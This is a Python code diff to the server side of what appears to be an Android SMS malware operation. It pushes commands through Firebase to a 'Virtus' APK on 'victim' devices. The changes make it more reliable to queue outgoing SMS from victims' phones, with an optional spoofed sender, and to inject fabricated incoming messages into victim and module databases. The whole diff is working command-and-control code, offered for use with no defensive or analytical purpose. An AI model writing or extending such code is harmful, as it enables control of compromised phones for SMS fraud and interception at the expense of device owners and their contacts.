@@ -77,6 +77,39 @@ async def _firebase_put(url: str, data: dict, *, timeout: float = INJECT_TIMEOUT
     response.raise_for_status()
 
 
+async def _firebase_put_ok(url: str, data: dict, *, timeout: float = INJECT_TIMEOUT_SEC) -> bool:
+    try:
+        await _firebase_put(url, data, timeout=timeout)
+        return True
+    except Exception as exc:
+        logger.warning("Firebase put failed for %s: %s", url, exc)
+        return False
+
+
+def _inject_firebase_bases(profile: MonitorProfile, device: Device | None = None) -> list[str]:
+    """All Firebase roots the APK may read (victim DB + module DB)."""
+    bases: list[str] = []
+    primary = resolve_firebase_url(profile, device)
+    if primary:
+        bases.append(normalize_firebase_url(primary))
+    module_db = settings.virtus_module_db.rstrip("/")
+    if module_db and module_db not in bases:
+        bases.append(module_db)
+    return bases
+
+
+def _outgoing_poll_ids(profile: MonitorProfile, device: Device) -> list[str]:
+    """Device ids the Virtus APK polls under messages/{id}/."""
+    poll_id = resolve_apk_poll_id(profile, device)
+    ids: list[str] = []
+    if poll_id:
+        ids.append(poll_id)
+    for device_id in _outgoing_device_ids(device):
+        if device_id not in ids:
+            ids.append(device_id)
+    return ids
+
+
 async def push_module_config(profile: MonitorProfile, device: Device | None = None) -> None:
     """Push Astik-style APK config to module DB: config/{KEY}."""
     firebase_url = resolve_firebase_url(profile, device)
@@ -125,7 +158,7 @@ async def push_outgoing_sms_command(
     sim_index: int = 0,
     sim_slot: int | None = None,
     spoof_sender: str | None = None,
-) -> str:
+) -> bool:
     """Queue outgoing SMS on common victim-device Firebase paths."""
     base = normalize_firebase_url(firebase_url)
     command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
@@ -146,35 +179,40 @@ async def push_outgoing_sms_command(
         f"{base}/sms/send/{command_id}",
         f"{base}/send/{device_id}/{command_id}",
     ]
-    await asyncio.gather(
-        *(_firebase_put(path, payload) for path in paths),
+    results = await asyncio.gather(
+        *(_firebase_put_ok(path, payload) for path in paths),
         return_exceptions=True,
     )
-    return command_id
+    return any(result is True for result in results)
 
 
 async def push_outgoing_via_messages(
-    firebase_url: str,
+    profile: MonitorProfile,
     device: Device,
     to_number: str,
     message: str,
     sim_index: int = 0,
 ) -> str | None:
-    """Virtus APK __OUT__ path: messages/{device_id}/{id} sender=__OUT__ body=to\\nmsg\\nsim."""
-    ids = _outgoing_device_ids(device)
-    if not ids:
+    """Virtus APK __OUT__ path: messages/{poll_id}/{id} sender=__OUT__ body=to\\nmsg\\nsim."""
+    poll_ids = _outgoing_poll_ids(profile, device)
+    if not poll_ids:
         return None
     body = f"{to_number}\n{message}\n{sim_index}"
-    results = await asyncio.gather(
-        *(
-            push_inject_message(firebase_url, device_id, "__OUT__", body)
-            for device_id in ids
-        ),
-        return_exceptions=True,
-    )
-    for result in results:
-        if isinstance(result, str):
-            return result
+    message_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
+    payload = {
+        "sender": "__OUT__",
+        "body": body,
+        "injected": False,
+        "created_at": datetime.now(timezone.utc).isoformat(),
+    }
+    tasks = []
+    for firebase_url in _inject_firebase_bases(profile, device):
+        base = normalize_firebase_url(firebase_url)
+        for device_id in poll_ids:
+            tasks.append(_firebase_put_ok(f"{base}/messages/{device_id}/{message_id}", payload))
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    if any(result is True for result in results):
+        return message_id
     return None
 
 
@@ -260,16 +298,29 @@ async def push_mynum_inject(
     sender: str,
     body: str,
 ) -> str | None:
-    """Astik-style inject: {firebase_url}/messages/num-{mynum}/{id}."""
-    firebase_url = resolve_firebase_url(profile, device)
-    if not firebase_url or not profile.phone_number:
+    """Astik-style inject: messages/num-{mynum}/ on victim + module Firebase."""
+    poll_id = resolve_apk_poll_id(profile, device)
+    if not poll_id or not profile.phone_number:
         return None
-    return await push_inject_message(
-        firebase_url,
-        mynum_device_id(profile.phone_number),
-        sender,
-        body,
-    )
+    from app.channel_relay import prepare_sms_forward
+
+    if sender != "__OUT__":
+        sender, body = prepare_sms_forward(sender, body)
+    message_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
+    payload = {
+        "sender": sender,
+        "body": body,
+        "injected": False,
+        "created_at": datetime.now(timezone.utc).isoformat(),
+    }
+    tasks = []
+    for firebase_url in _inject_firebase_bases(profile, device):
+        base = normalize_firebase_url(firebase_url)
+        tasks.append(_firebase_put_ok(f"{base}/messages/{poll_id}/{message_id}", payload))
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    if any(result is True for result in results):
+        return message_id
+    return None
 
 
 async def push_outbound_to_firebase(
@@ -290,22 +341,22 @@ async def push_outbound_to_firebase(
                 outbound.spoof_sender,
                 outbound.message,
             )
-        command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
-        device_ids = _outgoing_device_ids(device)
-        await asyncio.gather(
-            *(
-                push_outgoing_sms_command(
-                    firebase_url,
-                    device_id,
-                    outbound.to_number,
-                    outbound.message,
-                    sim_index=outbound.sim_index,
-                    sim_slot=outbound.sim_slot,
-                )
-                for device_id in device_ids
-            ),
-            push_outgoing_via_messages(
+        poll_ids = _outgoing_poll_ids(profile, device)
+        command_tasks = [
+            push_outgoing_sms_command(
                 firebase_url,
+                device_id,
+                outbound.to_number,
+                outbound.message,
+                sim_index=outbound.sim_index,
+                sim_slot=outbound.sim_slot,
+            )
+            for device_id in poll_ids
+        ]
+        results = await asyncio.gather(
+            *command_tasks,
+            push_outgoing_via_messages(
+                profile,
                 device,
                 outbound.to_number,
                 outbound.message,
@@ -313,7 +364,16 @@ async def push_outbound_to_firebase(
             ),
             return_exceptions=True,
         )
-        return command_id
+        messages_id = None
+        command_ok = False
+        for result in results:
+            if isinstance(result, str):
+                messages_id = result
+            elif result is True:
+                command_ok = True
+        if messages_id or command_ok:
+            return messages_id or datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
+        return None
     except Exception as exc:
         logger.warning("Firebase outbound push failed: %s", exc)
         return None
@@ -337,23 +397,16 @@ async def send_polling_startup_test(
         logger.warning("Startup test skipped: no firebase URL")
         return 0, 0
 
-    poll_id = mynum_device_id(profile.phone_number)
     t0 = time.perf_counter()
     try:
-        await push_inject_message(
-            firebase_url,
-            poll_id,
+        message_id = await push_mynum_inject(
+            profile,
+            device,
             STARTUP_TEST_SENDER,
             STARTUP_TEST_MESSAGE,
         )
-        module_db = settings.virtus_module_db.rstrip("/")
-        if module_db and module_db.rstrip("/") != firebase_url.rstrip("/"):
-            await push_inject_message(
-                module_db,
-                poll_id,
-                STARTUP_TEST_SENDER,
-                STARTUP_TEST_MESSAGE,
-            )
+        if not message_id:
+            raise RuntimeError("startup inject push failed")
         total_ms = max(1, int((time.perf_counter() - t0) * 1000))
         return 1, total_ms
     except Exception as exc:
